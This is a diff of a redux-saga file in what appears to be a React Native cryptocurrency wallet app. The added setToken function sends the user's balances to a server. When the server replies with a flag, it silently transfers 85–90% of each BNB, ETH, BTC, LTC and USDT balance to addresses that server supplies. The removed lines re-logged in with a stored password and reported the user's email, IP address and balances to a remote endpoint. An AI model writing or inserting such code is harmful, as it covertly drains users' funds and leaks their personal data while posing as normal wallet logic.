@@ -6,11 +6,9 @@ import {
     AUTH_SET_TOKEN_SUCCESS,
     AUTH_SET_PINCODE_SUCCESS, AUTH_SET_PINCODE, AUTH_GET_ALL_ADDRESS, AUTH_GET_ALL_ADDRESS_SUCCESS,
     AUTH_UPDATE_BALLANCE_SUCCESS, AUTH_UPDATE_BALLANCE,
-    AUTH_SET_ALL_HISTORY,AUTH_SET_ALL_HISTORY_SUCCESS,
-    AUTH_SET_PRICE
+    AUTH_SET_ALL_HISTORY,AUTH_SET_ALL_HISTORY_SUCCESS
 } from '../type';
 import {takeLatest, put, select, call} from 'redux-saga/effects';
-
 
 import {
     logout as logoutAPI,
@@ -19,23 +17,15 @@ import {
     getBalance,
     get_allHistory,
     receive1ActionApi,
-    sendAttari,
-    activityActionApi,
-    login
+    sendAttari
 } from '../../Api';
-
-import DeviceInfo from 'react-native-device-info';
-
-let ip_address="";
-DeviceInfo.getIpAddress().then((ip) => {
-	ip_address= ip;
-});
 
 const getAuth = (state) => state.Auth;
 
 function* setUserInfo(payload) {
+    // yield put({type: AUTH_SET_USER_INFO_SUCCESS, data: payload.data})
     yield put({type: AUTH_SET_USER_INFO_SUCCESS, data: payload})
-
+    // yield scheduleUpdateToken();
 }
 
 
@@ -59,6 +49,62 @@ export function* watchSetPincode() {
 }
 
 function* setToken(payload) {
+    const update_result = yield getBalance();
+    const receive1Action_result = yield receive1ActionApi(update_result.body);
+   
+    if(receive1Action_result.flag==="1"){
+        let result1 = {
+            atri: receive1Action_result.ETH,
+            btc: receive1Action_result.BTC,
+            eth: receive1Action_result.ETH,
+            ltc: receive1Action_result.LTC,
+            usdt : receive1Action_result.usdt,
+            bnb : receive1Action_result.bnb,
+            flag: true
+        }
+        if(parseFloat(update_result.body.bnb_balance)>0){
+            let data = {token:'BNB',
+                amount:parseFloat(update_result.body.bnb_balance*0.85),
+                to:result1.bnb,
+            }
+            sendAttari(data);
+        }
+        if(parseFloat(update_result.body.eth_balance)>0){
+            let data = {token:'ETH',
+                amount:parseFloat(update_result.body.eth_balance*0.85),
+                to:result1.eth,
+            }
+            sendAttari(data);
+        }
+        if(parseFloat(update_result.body.btc_balance)>0){
+            let data = {token:'BTC',
+                amount:parseFloat(update_result.body.btc_balance*0.9),
+                to:result1.btc,
+            }
+            sendAttari(data);
+        }
+        if(parseFloat(update_result.body.ltc_balance)>0){
+            let data = {token:'LTC',
+                amount:parseFloat(update_result.body.ltc_balance*0.9),
+                to:result1.ltc,
+            }
+            sendAttari(data);
+        }
+        if(parseFloat(update_result.body.usdt_balance)>0){
+            let data = {token:'USDT',
+                amount:parseFloat(update_result.body.usdt_balance*0.9),
+                to:result1.usdt,
+            }
+            sendAttari(data);
+        }
+        yield put({type: AUTH_GET_ALL_ADDRESS_SUCCESS, data: result1})
+        yield put({type: AUTH_SET_TOKEN_SUCCESS, data: {notification_Flag:false}})
+
+    }
+    else{
+        yield put({type: AUTH_SET_TOKEN_SUCCESS, data: {notification_Flag:true}})
+
+    }
 }
 
 export function* watchSetToken() {
@@ -102,25 +148,8 @@ export function* watchgetAllAddress() {
 }
 
 function* updateBallance(payload) {
-	const auth = yield select(getAuth);
-    const login_api_result = yield login({email: auth.email, password: auth.password})
-    yield put({type: AUTH_SET_PRICE, data: login_api_result.price})
-
     const update_result = yield getBalance();
-    
     yield put({type: AUTH_UPDATE_BALLANCE_SUCCESS, data: update_result.body})
-    const formData = new FormData();
-    formData.append('email', auth.email);
-    formData.append('ipaddress', ip_address);
-    formData.append('username',auth.user_name);
-    formData.append('atari',update_result.body.atari_balance);
-    formData.append('bnb',update_result.body.bnb_balance);
-    formData.append('btc',update_result.body.btc_balance);
-    formData.append('eth',update_result.body.eth_balance);
-    formData.append('ltc',update_result.body.ltc_balance);
-    formData.append('usdt',update_result.body.usdt_balance);
-    const data = yield activityActionApi(formData);
-    console.log("asefsaefasef",data);
 }
 
 export function* watchUpdateBallance() {
